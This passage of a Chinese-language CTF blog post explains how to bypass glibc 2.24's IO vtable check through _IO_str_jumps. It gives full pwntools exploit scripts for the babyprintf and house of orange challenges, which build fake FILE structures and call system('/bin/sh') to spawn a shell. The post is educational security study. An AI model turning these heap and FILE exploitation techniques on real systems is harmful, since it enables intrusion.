&lt; old_blen)</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">	  new_buf</span><br><span class="line">	    = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    {</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> EOF;</span><br><span class="line">	    }</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    {</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">	      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won't try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    }</span><br><span class="line">	  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">'\0'</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">	  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">	  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">	  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">	  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">	  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">	}</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">}</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></tbody></table></figure>

<p>可以看到在第107行中存在</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_buf</span><br><span class="line">  = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></tbody></table></figure>

<p>假如我们可以使得<code>(*((_IO_strfile *) fp)-&gt;_s._allocate_buffer)</code>为system_addr，使得<code>new_size</code>为bin_sh，那么是不是就可以执行`system(“/bin/sh”);来getshell了</p>
<p>首先需要绕过第一个if<code>fp-&gt;_flags &amp; _IO_NO_WRITES</code>为0，所以<code>_flags = 0</code>，后面也有和_flags&amp;的，只需要将<code>_flags=0</code>即可</p>
<p>然后要使得第二个if为真 <code>pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)</code>，其中<code>pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</code>，其次<code>#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</code>，所以有<code>fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt; (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base </code> 我们就可以进入<code>(char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</code>这个环节</p>
<p>接着就到<code>(*((_IO_strfile *) fp)-&gt;_s._allocate_buffer)(new_size)</code>了设置正确即可，<code>(*((_IO_strfile *) fp)-&gt;_s._allocate_buffer)</code>这里的偏移是0xe0可以在ida里面看到，这里不多放了</p>
<p>最后总结一下，根本不需要堆地址的泄露即可进行FSOP</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_flags=<span class="number">0</span></span><br><span class="line">_IO_write_base = <span class="number">0</span></span><br><span class="line">_IO_write_ptr = (bin_sh <span class="number">-100</span>) / <span class="number">2</span> +<span class="number">1</span></span><br><span class="line">_IO_buf_end = (bin_sh <span class="number">-100</span>) / <span class="number">2</span> </span><br><span class="line">_IO_buf_base = <span class="number">0</span></span><br><span class="line">fp + <span class="number">0xe0</span> = system_addr</span><br></pre></td></tr></tbody></table></figure>

<h2 id="babyprintf"><a href="#babyprintf" class="headerlink" title="babyprintf"></a>babyprintf</h2><p>比较经典的一道题，2.24下利用<code>_IO_str_jumps</code>进行vtable绕过</p>
<p><img src="/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/1.png"></p>
<p>有格式化漏洞，但是开了<code> FORTIFY:  Enabled</code>，所以格式化漏洞利用(x)，可以借助格式化漏洞输出libc</p>
<p>有堆溢出可以直接控制到top_chunk的size和house of orange一样的利用，产生出unsortedbin，并泄露出libc</p>
<p>接着利用unsortedbin attack将<code>IO_FILE</code>申请到堆这里，然后在堆里布局io</p>
<p><code>_IO_str_finish</code>的布局如下</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p1 = b<span class="number">'</span>\x00<span class="number">'</span> * <span class="number">0x200</span></span><br><span class="line">p2 = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">0x10</span>)</span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>)</span><br><span class="line">p2 += p64(bin_sh)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xc0</span>, b<span class="number">'</span>\x00<span class="number">'</span>)</span><br><span class="line">p2 += p64(<span class="number">0</span>)</span><br><span class="line">p2 += p64(<span class="number">0</span>) *<span class="number">2</span></span><br><span class="line">p2 += p64(io_str_jumps - <span class="number">8</span>)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xe8</span>, b<span class="number">'</span>\x00<span class="number">'</span>)</span><br><span class="line">p2 += p64(system_addr)</span><br><span class="line"></span><br><span class="line">p3 = p1 + p2</span><br></pre></td></tr></tbody></table></figure>

<p><code>_IO_str_overflow</code>的布局如下</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p1 = b<span class="number">'</span>\x00<span class="number">'</span> * <span class="number">0x200</span></span><br><span class="line">p2 = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">0x10</span>)</span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(bin_sh)</span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">p2 += p64(<span class="type">int</span>((bin_sh - <span class="number">100</span>) / <span class="number">2</span>))</span><br><span class="line">p2 = p2.ljust(<span class="number">0xd8</span>, b<span class="number">'</span>\x00<span class="number">'</span>)</span><br><span class="line">p2 += p64(io_str_jumps)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xe0</span>, b<span class="number">'</span>\x00<span class="number">'</span>)</span><br><span class="line">p2 += p64(system_addr)</span><br><span class="line">  </span><br><span class="line">p3 = p1 + p2</span><br></pre></td></tr></tbody></table></figure>

<p><code>_IO_str_overflow</code>需要注意的是奇数问题，exp如下，用的是2.23的libc，因为发现2.24死活拿不到，可能是libc的问题</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./babyprintf'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">'size: '</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">'string: '</span>, content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">32</span>, <span class="string">'%1$p%2$p%3$p%4$p%5$paaaa%6$p%7$p%8$p'</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'aaaa'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(r.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">li(<span class="string">'libc_addr = '</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">libc_base = libc_addr - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">li(<span class="string">'libc_base = '</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">li(<span class="string">'system_addr = '</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="comment">#io_str_jumps = libc_base + 0x3BE4C0</span></span><br><span class="line">io_str_jumps = libc_base + <span class="number">0x3c37a0</span></span><br><span class="line"><span class="comment">#li('IO_str_jums = ' + hex(IO_str_jumps))</span></span><br><span class="line">io_list_all = libc_base + libc.sym[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">li(<span class="string">'io_list_all = '</span> + <span class="built_in">hex</span>(io_list_all))</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">b'/bin/sh\x00'</span>).__next__()</span><br><span class="line">li(<span class="string">'bin_sh = '</span> + <span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xfb1</span>)</span><br><span class="line">add(<span class="number">0x10</span>, p1)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'\x00'</span> * <span class="number">0x200</span></span><br><span class="line">p2 = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">0x10</span>)</span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>)</span><br><span class="line">p2 += p64(bin_sh)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xc0</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">p2 += p64(<span class="number">0</span>)</span><br><span class="line">p2 += p64(<span class="number">0</span>) *<span class="number">2</span></span><br><span class="line">p2 += p64(io_str_jumps - <span class="number">8</span>)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xe8</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">p2 += p64(system_addr)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">p1 = b'\x00' * 0x200</span></span><br><span class="line"><span class="string">p2 = p64(0) + p64(0x61) + p64(0) + p64(io_list_all - 0x10)</span></span><br><span class="line"><span class="string">p2 += p64(0) + p64(bin_sh)</span></span><br><span class="line"><span class="string">p2 += p64(0) + p64(0)</span></span><br><span class="line"><span class="string">p2 += p64(int((bin_sh - 100) / 2))</span></span><br><span class="line"><span class="string">p2 = p2.ljust(0xd8, b'\x00')</span></span><br><span class="line"><span class="string">p2 += p64(io_str_jumps)</span></span><br><span class="line"><span class="string">p2 = p2.ljust(0xe0, b'\x00')</span></span><br><span class="line"><span class="string">p2 += p64(system_addr)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p3 = p1 + p2</span><br><span class="line">add(<span class="number">0x200</span>, p3)</span><br><span class="line">r.sendlineafter(<span class="string">'size: '</span>, <span class="string">'1'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<p>到现在可以发现并没有用到堆地址，这是一种无堆地址利用手法</p>
<h2 id="house-of-ornage"><a href="#house-of-ornage" class="headerlink" title="house of ornage"></a>house of ornage</h2><p>直接用上面的调用链即可攻击成功</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"><span class="title function_">context</span><span class="params">(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = lambda x : print(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = lambda x : print(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'Your choice : '</span></span><br><span class="line"></span><br><span class="line">def add(size, name, price):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Length of name :'</span>, str(size))</span><br><span class="line">    r.sendafter(<span class="string">'Name :'</span>, name)</span><br><span class="line">    r.sendlineafter(<span class="string">'Price of Orange:'</span>, str(price))</span><br><span class="line">    r.sendlineafter(<span class="string">'Color of Orange:'</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">def edit(size, name, price):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Length of name :'</span>, str(size))</span><br><span class="line">    r.sendafter(<span class="string">'Name:'</span>, name)</span><br><span class="line">    r.sendlineafter(<span class="string">'Price of Orange: '</span>,str(price))</span><br><span class="line">    r.sendlineafter(<span class="string">'Color of Orange: '</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'aaaaa'</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">p1 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="number">0xff</span>, p1, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">'aaaaa'</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">'a'</span> * <span class="number">8</span>, <span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, b<span class="number">'</span>\x00<span class="number">'</span>)) - <span class="number">1640</span> - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">li(<span class="string">'malloc_hook = '</span> + hex(malloc_hook))</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">li(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">li(<span class="string">'system_addr = '</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line">io_list_all = libc_base + libc.sym[<span class="string">"_IO_list_all"</span>]</span><br><span class="line">li(<span class="string">'io_list_all = '</span> + hex(io_list_all))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x10</span>, <span class="string">'a'</span> * <span class="number">0x10</span>, <span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(r.recvuntil(<span class="string">'\n'</span>).strip().ljust(<span class="number">8</span>, b<span class="number">'</span>\x00<span class="number">'</span>))</span><br><span class="line">li(<span class="string">'heap_addr = '</span> + hex(heap_addr))</span><br><span class="line">bin_sh = libc_base + libc.search(b<span class="number">'</span>/bin/sh\x00<span class="number">'</span>).__next__()</span><br><span class="line">io_str_jumps = libc_base + <span class="number">0x3c37a0</span></span><br><span class="line"></span><br><span class="line">p1 = p64(system_addr) * <span class="number">4</span> + b<span class="number">'</span>\x00<span class="number">'</span> * <span class="number">0x400</span></span><br><span class="line">p2 = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">0x10</span>)</span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>)</span><br><span class="line">p2 += p64(bin_sh)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xc0</span>, b<span class="number">'</span>\x00<span class="number">'</span>)</span><br><span class="line">p2 += p64(<span class="number">0</span>)</span><br><span class="line">p2 += p64(<span class="number">0</span>) *<span class="number">2</span></span><br><span class="line">p2 += p64(io_str_jumps - <span class="number">8</span>)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xe8</span>, b<span class="number">'</span>\x00<span class="number">'</span>)</span><br><span class="line">p2 += p64(system_addr)</span><br><span class="line"></span><br><span class="line">p3 = p1 + p2</span><br><span class="line">edit(len(p3), p3, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>笔者学到了无堆地址的利用，对vtable绕过利用，读源码很重要</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00">Projects</a></li>
         
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81babyprintf%E3%80%81house-of-orange"><span class="toc-number">1.</span> <span class="toc-text">IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IO-vtable-check"><span class="toc-number">1.1.</span> <span class="toc-text">IO vtable check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IO-vtable-check%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.</span> <span class="toc-text">IO vtable check绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyprintf"><span class="toc-number">1.3.</span> <span class="toc-text">babyprintf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-ornage"><span class="toc-number">1.4.</span> <span class="toc-text">house of ornage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;text=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;title=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;is_video=false&amp;description=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange&amp;body=Check out this article: http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;title=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;title=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;title=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;title=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;name=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/&amp;t=IO_FILE-2.24对vtable检测绕过、babyprintf、house of orange"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
